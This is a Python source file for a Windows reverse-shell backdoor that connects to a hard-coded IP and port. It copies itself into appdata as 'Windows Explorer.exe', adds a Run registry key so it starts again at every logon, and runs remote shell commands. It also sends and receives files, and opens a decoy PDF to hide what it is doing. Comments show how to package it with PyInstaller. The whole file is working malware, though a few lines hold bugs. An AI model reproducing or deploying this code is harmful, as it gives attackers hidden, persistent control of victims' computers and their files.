#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
	def __init__(self, ip, port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
	def become_persistent(self):
			evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
			if not os.path.exists(evil_file_location):
				shutil.copyfile(sys.executable, evil_file_location)
				subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)



	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = b""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command):
		try:
			DEVNULL = open(os.devnull, 'wb')
		
			return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
		except subprocess.CalledProcessError:
			return "erro during command execution"

		
	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	
	def write_file(self,path,content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful."
	def run(self):
		while True:			
			command = self.reliable_receive()

			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()

				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
					
				elif command[0] == "download":
					command_result = self.read_file(command[1]).decode()

				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:

					command_result = self.execute_system_command(command).decode()
			except Exception:
				command_result = "[-] Error during command execution."

			
			self.reliable_send(command_result)

file_name = sys.MEIPASS + "\backdoor.pdf"
subprocess.Popen(file_name, shell = True)

try:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
	my_backdoor = Backdoor("192.168.220.35", 4444)
	my_backdoor.run()
except execution:
	sys.exit()
#C:\Users\anonymous\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe backdoor_serilisation_window.py --onefile

#That is not install python interpreter in window for using
#C:\Users\anonymous\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe backdoor_serialisation_window.py --onefile --console


